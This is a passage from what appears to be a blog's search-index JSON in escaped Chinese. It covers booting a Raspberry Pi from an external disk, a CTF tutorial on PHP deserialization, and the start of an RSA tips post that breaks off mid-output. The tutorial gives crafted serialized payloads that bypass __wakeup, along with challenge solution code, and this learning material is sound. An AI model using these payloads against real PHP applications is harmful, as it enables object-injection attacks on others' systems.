\u547d\u4ee4\u6267\u884c\u5199\u5165\u4e4b\u524d\uff0c\u6240\u6709\u6539\u52a8\u90fd\u662f\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u4f60\u89c9\u5f97\u6709\u95ee\u9898\u7684\u8bdd\uff0c Ctrl-C \u9000\u51fa\u91cd\u6765\u5c31\u597d\u3002 \u521b\u5efa\u597d\u5206\u533a\u4e4b\u540e\u683c\u5f0f\u5316\u6210 ext4\uff1a sudo mkfs.ext4 /dev/sda1 \u3002 \u8fd0\u884c sudo gdisk /dev/sda \u8fdb\u5165 gdisk \u5de5\u5177\u7684\u4ea4\u4e92\u6a21\u5f0f\u3002\u5728\u8fd9\u91cc\u68c0\u89c6\u4e00\u4e0b\u4f60\u60f3\u7528\u4e8e Raspbian \u7684\u5206\u533a\uff0c\u83b7\u53d6\u5230 UUID\u3002\u4ee5\u4e0b\u4f8b\u5b50\u6765\u81ea Stefan\u2019s Blog root@raspberrypi:/home/pi# gdisk /dev/sda GPT fdisk (gdisk) version 0.8.5 Partition table scan: MBR: hybrid BSD: not present APM: not present GPT: present Found valid GPT with hybrid MBR; using GPT. Command (? for help): i Partition number (1-3): 2 Partition GUID code: 0FC63DAF-8483-4772-8E79-3D69D8477DE4 (Linux filesystem) Partition unique GUID: 176ADF0D-357D-4C4B-ADC0-371342F444AB First sector: 2099200 (at 1.0 GiB) Last sector: 23070719 (at 11.0 GiB) Partition size: 20971520 sectors (10.0 GiB) Attribute flags: 0000000000000000 Partition name: '' Command (? for help): q UUID \u662f\u8ddf\u5728 \u201cPartition unique GUID\u201d \u540e\u9762\u90a3\u4e32\u5b57\u6bcd\uff0c\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u4e5f\u5c31\u662f 176ADF0D-357D-4C4B-ADC0-371342F444AB \u3002 \u63a5\u4e0b\u6765\u7f16\u8f91 /boot/cmdline.txt \uff0c\u5c06\u5176\u4e2d root=/dev/mmcblk0p2 \u6539\u4e3a root=PARTUUID=\u5206\u533a\u7684UUID \u7136\u540e\u4fdd\u5b58\u3002 \u968f\u540e\uff0c\u7f16\u8f91 /etc/fstab \u5c06 /boot \u6302\u8f7d\u4e3a\u53ea\u8bfb\u6a21\u5f0f\uff0c\u5c06\u79fb\u52a8\u786c\u76d8\u4e5f\u6dfb\u52a0\u8fdb\u53bb\uff0c\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u3002\u9ed8\u8ba4\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u7684\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat defaults 0 2 /dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u66f4\u6539\u4e4b\u540e\u5185\u5bb9\u5927\u6982\u50cf\u8fd9\u6837\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat ro 0 2 /dev/sda1 / ext4 defaults,errors=remount-ro 0 1 #/dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u6700\u540e\uff0c\u5c06 / \u4e0b\u7684\u5185\u5bb9\u5168\u90e8\u5199\u5165\u5230\u79fb\u52a8\u786c\u76d8\u4e2d\u3002\u4ee5\u6211\u81ea\u5df1\u7684\u914d\u7f6e\u4e3a\u4f8b\uff0c\u4f7f\u7528 /dev/sda1 \u5206\u533a\uff1a dd if=/dev/mmcblk0p2 of=/dev/sda1 \u56e0\u4e3a Raspbian \u9ed8\u8ba4\u662f\u5c06 SD \u5361\u7684\u7b2c\u4e8c\u4e2a\u5206\u533a\uff08\u4e5f\u5c31\u662f /dev/mmcblk0p2 \uff09\u6302\u8f7d\u5230 / \u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u4ece\u8fd9\u4e2a\u5206\u533a\u8bfb\u53d6\uff0c\u5199\u5165\u5230\u76ee\u6807\u5206\u533a\u5c31\u53ef\u4ee5\u3002 \u5199\u5165\u5b8c\u6210\u4e4b\u540e\uff0c /dev/sda1 \u7684\u5927\u5c0f\u4e0e /dev/mmcblk0p2 \u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u4f1a\u8fdc\u8fdc\u5c0f\u4e8e\u4f60\u521b\u5efa\u8fd9\u4e2a\u5206\u533a\u65f6\u6307\u5b9a\u7684\u5927\u5c0f\u3002\u53ef\u4ee5\u4f7f\u7528 sudo resize2fs /dev/sda1 \u6765\u5c55\u5f00\u5230\u5b8c\u6574\u7684\u5927\u5c0f\u3002 \u63a5\u4e0b\u6765\u91cd\u542f\u5c31\u597d\u4e86\u3002 \u5728\u8fc7\u7a0b\u4e2d\u5982\u679c\u4e0d\u614e\u4fee\u6539\u9519\u4e86\u53c2\u6570\uff0c\u6216\u8005\u5c06\u4e0d\u6b63\u786e\u7684\u5206\u533a\u6302\u8f7d\u4e3a\u53ea\u8bfb\u4e86\uff0c\u4e0d\u5fc5\u60ca\u614c\uff0c\u4e5f\u4e0d\u9700\u8981\u9a6c\u4e0a\u91cd\u88c5\u7cfb\u7edf\u3002\u53ea\u8981\u5c06\u6811\u8393\u6d3e\u65ad\u7535\uff0cSD \u5361\u62d4\u51fa\u6765\u8fde\u63a5\u5230\u522b\u7684\u7535\u8111\u4e0a\uff0c\u4fee\u6539 /boot/cmdline.txt \u91cc\u7684\u53c2\u6570\uff0c\u6539\u4e3a\u9ed8\u8ba4\u7684\u6302\u8f7d SD \u5361\u7b2c\u4e8c\u5206\u533a\u5373\u53ef\u3002\u91cd\u542f\u540e\u53ef\u4ee5\u901a\u8fc7 sudo mount -o remount,rw /dev/sda1 \u5c06 /etc/fstab \u4e2d\u6307\u5b9a\u7684\u5206\u533a\u91cd\u65b0\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u6a21\u5f0f\u6765\u8fdb\u884c\u4fee\u6539\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.mynook.info/post/boot-raspberrypi-from-external-hdd/","title":"\u8bbe\u7f6e\u6811\u8393\u6d3e\u4f7f\u7528\u5916\u7f6e\u786c\u76d8\u542f\u52a8"},{"location":"other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u6982\u5ff5 \u5e8f\u5217\u5316\u5c31\u662f\u5c06\u5bf9\u8c61\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u3002\u5b57\u7b26\u4e32\u5305\u62ec \u5c5e\u6027\u540d \u5c5e\u6027\u503c \u5c5e\u6027\u7c7b\u578b\u548c\u8be5\u5bf9\u8c61\u5bf9\u5e94\u7684\u7c7b\u540d\u3002 \u53cd\u5e8f\u5217\u5316\u5219\u76f8\u53cd\u5c06\u5b57\u7b26\u4e32\u91cd\u65b0\u6062\u590d\u6210\u5bf9\u8c61\u3002 \u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u5229\u4e8e\u5bf9\u8c61\u7684\u4fdd\u5b58\u548c\u4f20\u8f93,\u4e5f\u53ef\u4ee5\u8ba9\u591a\u4e2a\u6587\u4ef6\u5171\u4eab\u5bf9\u8c61\u3002 \u5e8f\u5217\u5316\u4e2d\u5e38\u89c1\u7684\u9b54\u6cd5\u51fd\u6570\uff1a __construct() \u521b\u5efa\u5bf9\u8c61\u65f6\u8c03\u7528 __destruct() \u9500\u6bc1\u5bf9\u8c61\u65f6\u8c03\u7528 __toString() \u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f7f\u7528 __sleep() \u5728\u5bf9\u8c61\u5728\u88ab\u5e8f\u5217\u5316\u4e4b\u524d\u8fd0\u884c __wakeup \u5c06\u5728\u5e8f\u5217\u5316\u4e4b\u540e\u7acb\u5373\u88ab\u8c03\u7528 \u770b\u4e00\u4e32\u5b57\u7b26\u4e32 O:3:\"Ctf\":3{s:4:\"flag\";s:13:\"flag{abedyui}\";s:4:\"name\";s:7:\"Sch0lar\";s:3:\"age\";s:2:\"18\";} O\u4ee3\u8868\u5bf9\u8c61 \u56e0\u4e3a\u6211\u4eec\u5e8f\u5217\u5316\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61 \u5e8f\u5217\u5316\u6570\u7ec4\u5219\u7528A\u6765\u8868\u793a 3 \u4ee3\u8868\u7c7b\u540d\u5b57\u5360\u4e09\u4e2a\u5b57\u7b26 ctf \u7c7b\u540d 3 \u4ee3\u8868\u4e09\u4e2a\u5c5e\u6027 s\u4ee3\u8868\u5b57\u7b26\u4e32 4\u4ee3\u8868\u5c5e\u6027\u540d\u957f\u5ea6 flag\u5c5e\u6027\u540d s:13:\"flag{abedyui}\" \u5b57\u7b26\u4e32 \u5c5e\u6027\u503c\u957f\u5ea6 \u5c5e\u6027\u503c \u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26 \u6839\u636e\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26\u7684\u4e0d\u540c \u5e8f\u5217\u5316\u540e\u7684 \u5c5e\u6027\u957f\u5ea6\u548c\u5c5e\u6027\u503c\u4f1a\u6709\u6240\u4e0d\u540c,\u6240\u4ee5\u8fd9\u91cc\u7b80\u5355\u63d0\u4e00\u4e0b public(\u516c\u6709) protected(\u53d7\u4fdd\u62a4) private(\u79c1\u6709\u7684) protected\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210\uff1a%00*%00\u5c5e\u6027\u540d private\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210\uff1a%00\u7c7b\u540d%00\u5c5e\u6027\u540d \u5c31\u50cf\u8fd9\u6837 O:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}//\u8fd9\u91cc\u662fprivate\u5c5e\u6027\u88ab\u5e8f\u5217\u5316 \u7ed5\u8fc7__wakeup()\u51fd\u6570 \u5f53\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u4e2a\u6570\u7684\u5c5e\u6027\u65f6\u5c31\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c\u3002 //\u5c06\u4e0a\u9762\u7684\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u503c\u6539\u6210\u903c\u771f\u5b9e\u4e2a\u6570\u6253 O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} \u770b\u51e0\u9053\u57fa\u7840\u7684\u9898\u76ee [\u6781\u5ba2\u5927\u6311\u6218 2019]PHP \u626b\u76ee\u5f55\u62ff\u5230www.zip\u7f51\u7ad9\u7684\u5907\u4efd\u6e90\u7801\u3002 <?php include 'flag.php'; error_reporting(0); class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this->username = $username; $this->password = $password; } function __wakeup(){ $this->username = 'guest'; } function __destruct(){ if ($this->password != 100) { echo \"</br>NO!!!hacker!!!</br>\"; echo \"You name is: \"; echo $this->username;echo \"</br>\"; echo \"You password is: \"; echo $this->password;echo \"</br>\"; die(); } if ($this->username === 'admin') { global $flag; echo $flag; }else{ echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\"; die(); } } } $a = new Name(\"admin\",100); $a = serialize($a); echo $a; ?> \u5f97\u5230 O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;} \u7ed5\u8fc7__wakeup O:4:\"Name\":3:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;} private\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210%00\u7c7b\u540d%00\u5c5e\u6027\u540d,\u6839\u636e\u89c4\u5219\u8fdb\u884c\u4fee\u6539 O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} \u7136\u540e?select\u4f20\u503c ?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} ISCC2020-Php is the best language(php\u53cd\u5e8f\u5217\u5316) <?php @error_reporting(1); include 'flag.php'; class baby { public $file=\"flag.php\"; //\u672c\u6765\u662fpublic $file\u8fd9\u91cc\u6539\u6210public $file=\"flag.php\"; function __toString() { if(isset($this->file)) { $filename = \"./{$this->file}\"; if (base64_encode(file_get_contents($filename))) { return base64_encode(file_get_contents($filename)); } } } }/* if (isset($_GET['data'])) { $data = $_GET['data']; $good = unserialize($data); echo $good; } else { $url='./index.php'; } $html=''; if(isset($_POST['test'])){ $s = $_POST['test']; $html.=\"<p>\u8c22\u8c22\u53c2\u4e0e!</p>\"; }*/ //\u4e0b\u9762\u662f\u89e3\u9898\u4ee3\u7801 $a = new baby(\"flag.php\"); $a = serialize($a); echo $a; //O:4:\"baby\":1:{s:4:\"file\";s:8:\"flag.php\";} ?> \u7136\u540e\u4f20\u503c \u539f\u6587\u94fe\u63a5\uff1a https://www.cnblogs.com/HelloCTF/p/13044403.html","title":"CTF\u4e2d\u7684\u5e8f\u5217\u5316\u4e0e\u53cd\u5e8f\u5217\u5316"},{"location":"other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"\u5e8f\u5217\u5316\u5c31\u662f\u5c06\u5bf9\u8c61\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u3002\u5b57\u7b26\u4e32\u5305\u62ec \u5c5e\u6027\u540d \u5c5e\u6027\u503c \u5c5e\u6027\u7c7b\u578b\u548c\u8be5\u5bf9\u8c61\u5bf9\u5e94\u7684\u7c7b\u540d\u3002 \u53cd\u5e8f\u5217\u5316\u5219\u76f8\u53cd\u5c06\u5b57\u7b26\u4e32\u91cd\u65b0\u6062\u590d\u6210\u5bf9\u8c61\u3002 \u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u5229\u4e8e\u5bf9\u8c61\u7684\u4fdd\u5b58\u548c\u4f20\u8f93,\u4e5f\u53ef\u4ee5\u8ba9\u591a\u4e2a\u6587\u4ef6\u5171\u4eab\u5bf9\u8c61\u3002","title":"\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u6982\u5ff5"},{"location":"other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_2","text":"__construct() \u521b\u5efa\u5bf9\u8c61\u65f6\u8c03\u7528 __destruct() \u9500\u6bc1\u5bf9\u8c61\u65f6\u8c03\u7528 __toString() \u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f7f\u7528 __sleep() \u5728\u5bf9\u8c61\u5728\u88ab\u5e8f\u5217\u5316\u4e4b\u524d\u8fd0\u884c __wakeup \u5c06\u5728\u5e8f\u5217\u5316\u4e4b\u540e\u7acb\u5373\u88ab\u8c03\u7528","title":"\u5e8f\u5217\u5316\u4e2d\u5e38\u89c1\u7684\u9b54\u6cd5\u51fd\u6570\uff1a"},{"location":"other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_3","text":"O:3:\"Ctf\":3{s:4:\"flag\";s:13:\"flag{abedyui}\";s:4:\"name\";s:7:\"Sch0lar\";s:3:\"age\";s:2:\"18\";} O\u4ee3\u8868\u5bf9\u8c61 \u56e0\u4e3a\u6211\u4eec\u5e8f\u5217\u5316\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61 \u5e8f\u5217\u5316\u6570\u7ec4\u5219\u7528A\u6765\u8868\u793a 3 \u4ee3\u8868\u7c7b\u540d\u5b57\u5360\u4e09\u4e2a\u5b57\u7b26 ctf \u7c7b\u540d 3 \u4ee3\u8868\u4e09\u4e2a\u5c5e\u6027 s\u4ee3\u8868\u5b57\u7b26\u4e32 4\u4ee3\u8868\u5c5e\u6027\u540d\u957f\u5ea6 flag\u5c5e\u6027\u540d s:13:\"flag{abedyui}\" \u5b57\u7b26\u4e32 \u5c5e\u6027\u503c\u957f\u5ea6 \u5c5e\u6027\u503c","title":"\u770b\u4e00\u4e32\u5b57\u7b26\u4e32"},{"location":"other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_4","text":"\u6839\u636e\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26\u7684\u4e0d\u540c \u5e8f\u5217\u5316\u540e\u7684 \u5c5e\u6027\u957f\u5ea6\u548c\u5c5e\u6027\u503c\u4f1a\u6709\u6240\u4e0d\u540c,\u6240\u4ee5\u8fd9\u91cc\u7b80\u5355\u63d0\u4e00\u4e0b public(\u516c\u6709) protected(\u53d7\u4fdd\u62a4) private(\u79c1\u6709\u7684) protected\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210\uff1a%00*%00\u5c5e\u6027\u540d private\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210\uff1a%00\u7c7b\u540d%00\u5c5e\u6027\u540d \u5c31\u50cf\u8fd9\u6837 O:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}//\u8fd9\u91cc\u662fprivate\u5c5e\u6027\u88ab\u5e8f\u5217\u5316","title":"\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26"},{"location":"other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#__wakeup","text":"\u5f53\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u4e2a\u6570\u7684\u5c5e\u6027\u65f6\u5c31\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c\u3002 //\u5c06\u4e0a\u9762\u7684\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u503c\u6539\u6210\u903c\u771f\u5b9e\u4e2a\u6570\u6253 O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}","title":"\u7ed5\u8fc7__wakeup()\u51fd\u6570"},{"location":"other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_5","text":"","title":"\u770b\u51e0\u9053\u57fa\u7840\u7684\u9898\u76ee"},{"location":"other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#2019php","text":"\u626b\u76ee\u5f55\u62ff\u5230www.zip\u7f51\u7ad9\u7684\u5907\u4efd\u6e90\u7801\u3002 <?php include 'flag.php'; error_reporting(0); class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this->username = $username; $this->password = $password; } function __wakeup(){ $this->username = 'guest'; } function __destruct(){ if ($this->password != 100) { echo \"</br>NO!!!hacker!!!</br>\"; echo \"You name is: \"; echo $this->username;echo \"</br>\"; echo \"You password is: \"; echo $this->password;echo \"</br>\"; die(); } if ($this->username === 'admin') { global $flag; echo $flag; }else{ echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\"; die(); } } } $a = new Name(\"admin\",100); $a = serialize($a); echo $a; ?> \u5f97\u5230 O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;} \u7ed5\u8fc7__wakeup O:4:\"Name\":3:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;} private\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210%00\u7c7b\u540d%00\u5c5e\u6027\u540d,\u6839\u636e\u89c4\u5219\u8fdb\u884c\u4fee\u6539 O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} \u7136\u540e?select\u4f20\u503c ?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}","title":"[\u6781\u5ba2\u5927\u6311\u6218 2019]PHP"},{"location":"other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#iscc2020-php-is-the-best-languagephp","text":"<?php @error_reporting(1); include 'flag.php'; class baby { public $file=\"flag.php\"; //\u672c\u6765\u662fpublic $file\u8fd9\u91cc\u6539\u6210public $file=\"flag.php\"; function __toString() { if(isset($this->file)) { $filename = \"./{$this->file}\"; if (base64_encode(file_get_contents($filename))) { return base64_encode(file_get_contents($filename)); } } } }/* if (isset($_GET['data'])) { $data = $_GET['data']; $good = unserialize($data); echo $good; } else { $url='./index.php'; } $html=''; if(isset($_POST['test'])){ $s = $_POST['test']; $html.=\"<p>\u8c22\u8c22\u53c2\u4e0e!</p>\"; }*/ //\u4e0b\u9762\u662f\u89e3\u9898\u4ee3\u7801 $a = new baby(\"flag.php\"); $a = serialize($a); echo $a; //O:4:\"baby\":1:{s:4:\"file\";s:8:\"flag.php\";} ?> \u7136\u540e\u4f20\u503c \u539f\u6587\u94fe\u63a5\uff1a https://www.cnblogs.com/HelloCTF/p/13044403.html","title":"ISCC2020-Php is the best language(php\u53cd\u5e8f\u5217\u5316)"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/","text":"MathJax.Hub.Config({ tex2jax: { inlineMath: [ [\"$\",\"$\"], [\"\\\\(\",\"\\\\)\"] ], skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'], processEscapes: true } }); MathJax.Hub.Queue(function() { var all = MathJax.Hub.getAllJax(); for (var i = 0; i < all.length; ++i) all[i].SourceElement().parentNode.className += ' has-jax'; }); RSA \u4ecb\u7ecd RSA \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5728\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u548c\u7535\u5b50\u5546\u4e1a\u4e2d RSA \u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002RSA \u662f 1977 \u5e74\u7531\u7f57\u7eb3\u5fb7\u00b7\u674e\u7ef4\u65af\u7279\uff08Ron Rivest\uff09\u3001\u963f\u8fea\u00b7\u8428\u83ab\u5c14\uff08Adi Shamir\uff09\u548c\u4f26\u7eb3\u5fb7\u00b7\u963f\u5fb7\u66fc\uff08Leonard Adleman\uff09\u4e00\u8d77\u63d0\u51fa\u7684\u3002RSA \u5c31\u662f \u4ed6\u4eec\u4e09\u4eba\u59d3\u6c0f\u5f00\u5934\u5b57\u6bcd\u62fc\u5728\u4e00\u8d77\u7ec4\u6210\u7684\u3002 RSA \u7b97\u6cd5\u7684\u53ef\u9760\u6027\u7531\u6781\u5927\u6574\u6570\u56e0\u6570\u5206\u89e3\u7684\u96be\u5ea6\u51b3\u5b9a\u3002\u6362\u8a00\u4e4b\uff0c\u5bf9\u4e00\u6781\u5927\u6574\u6570\u505a\u56e0\u6570\u5206\u89e3\u6108\u56f0\u96be\uff0cRSA \u7b97\u6cd5\u6108\u53ef\u9760\u3002\u5047\u5982\u6709\u4eba\u627e\u5230\u4e00\u79cd\u5feb\u901f\u56e0\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u7684\u8bdd\uff0c\u90a3\u4e48\u7528 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u7684\u53ef\u9760\u6027\u5c31\u80af\u5b9a\u4f1a\u6781\u5ea6\u4e0b\u964d\u3002\u4f46\u627e\u5230\u8fd9\u6837\u7684\u7b97\u6cd5 \u7684\u53ef\u80fd\u6027\u662f\u975e\u5e38\u5c0f\u7684\u3002\u5982\u4eca\uff0c\u53ea\u6709\u77ed\u7684 RSA \u5bc6\u94a5\u624d\u53ef\u80fd\u88ab\u5f3a\u529b\u65b9\u5f0f\u89e3\u7834\u3002\u5230 2017 \u5e74\u4e3a\u6b62\uff0c\u8fd8\u6ca1\u6709\u4efb\u4f55\u53ef\u9760\u7684\u653b\u51fb RSA \u7b97\u6cd5\u7684\u65b9\u5f0f\u3002 \u57fa\u672c\u539f\u7406 \u516c\u94a5\u4e0e\u79c1\u94a5\u7684\u4ea7\u751f \u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u540c\u5927\u8d28\u6570 $p$ \u548c $q$\uff0c\u8ba1\u7b97 $N = p \\times q$ \u6839\u636e\u6b27\u62c9\u51fd\u6570\uff0c\u6c42\u5f97 $\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)$ \u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e $\\varphi (N)$ \u7684\u6574\u6570 $e$\uff0c\u4f7f $e$ \u548c $\\varphi (N)$ \u4e92\u8d28\u3002\u5e76\u6c42\u5f97 $e$ \u5173\u4e8e $\\varphi (N)$ \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u547d\u540d\u4e3a $d$\uff0c\u6709 $ed\\equiv 1 \\pmod {\\varphi (N)}$ \u5c06 $p<200b>$ \u548c $q<200b>$ \u7684\u8bb0\u5f55\u9500\u6bc1 \u6b64\u65f6\uff0c$(N,e)$ \u662f\u516c\u94a5\uff0c$(N,d)$ \u662f\u79c1\u94a5\u3002 \u516c\u94a5/\u79c1\u94a5\u6587\u4ef6\u8bfb\u53d6 from Crypto.PublicKey import RSA pk = b '''-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0StjnfdZqZya21dQC71j UEGqcPjnP26hWLI7mvV1kVz2jPjlewRbvrz3ipvKcr8OY8tuw1PWYUIEjLaetfIM 3GuvbIXnfm8qqQbcWGj8sPAzDetVB27fGyJu9Ukm3SrTyUPI6zXLjIWEjgXqhoCY ihgnAbag3FSWd2DKwoE2rVs9nxz3lSuJjPqvhjqQv9WN8Po/NYp+uLy+G/zxOHK7 ufzCszCjjz/WiUZ/7yLwJ1SfU9Rg6f67SPGuFfe/upMGlkH9U8RvyXFWD1lV2Pbk GfWYGpujk3GNeF9YZZYH9RH2zEB3g04FnzaOsFvKeWTqLcjNGxP2KinqJEo4dv9Z ZwIDAQAB -----END PUBLIC KEY-----''' keyPub = RSA . importKey ( pk ) >>> keyPub RsaKey ( n = 26405201714915839490865227813246218372938736243516916108608439705738170543023112509150522274284238701776297205717958250714972924576706985074311737321016048409831557758205687745692399643151467933196930799657476449865271038382866908177517793954543176769652784274788769353482450910551831498252972857285424471782215525406445071432588374802623485148684255853068532820859835479998199886719945699488858505070686919320144576280217196858823521754407597888769668827432569034617434944912323704501156532854074083408527717809315663187405585840074689387865750105223058720511199252150772925124516509254841404742306560035497627834727 , e = 65537 ) $ openssl rsa -inform PEM -pubin -in pubkey.pem -text -noout RSA Public-Key: ( 2048 bit ) Modulus: 00 :d1:2b:63:9d:f7:59:a9:9c:9a:db:57:50:0b:bd: 63 :50:41:aa:70:f8:e7:3f:6e:a1:58:b2:3b:9a:f5: 75 :91:5c:f6:8c:f8:e5:7b:04:5b:be:bc:f7:8a:9b: ca:72:bf:0e:63:cb:6e:c3:53:d6:61:42:04:8c:b6: 9e:b5:f2:0c:dc:6b:af:6c:85:e7:7e:6f:2a:a9:06: dc:58:68:fc:b0:f0:33:0d:eb:55:07:6e:df:1b:22: 6e:f5:49:26:dd:2a:d3:c9:43:c8:eb:35:cb:8c:85: 84 :8e:05:ea:86:80:98:8a:18:27:01:b6:a0:dc:54: 96 :77:60:ca:c2:81:36:ad:5b:3d:9f:1c:f7:95:2b: 89 :8c:fa:af:86:3a:90:bf:d5:8d:f0:fa:3f:35:8a: 7e:b8:bc:be:1b:fc:f1:38:72:bb:b9:fc:c2:b3:30: a3:8f:3f:d6:89:46:7f:ef:22:f0:27:54:9f:53:d4: 60 :e9:fe:bb:48:f1:ae:15:f7:bf:ba:93:06:96:41: fd:53:c4:6f:c9:71:56:0f:59:55:d8:f6:e4:19:f5: 98 :1a:9b:a3:93:71:8d:78:5f:58:65:96:07:f5:11: f6:cc:40:77:83:4e:05:9f:36:8e:b0:5b:ca:79:64: ea:2d:c8:cd:1b:13:f6:2a:29:ea:24:4a:38:76:ff: 59 :67 Exponent: 65537 ( 0x10001 ) $ openssl rsa -inform PEM -in privatekey.pem -text -noout RSA Private-Key: ( 2048 bit, 2 primes ) modulus: 00 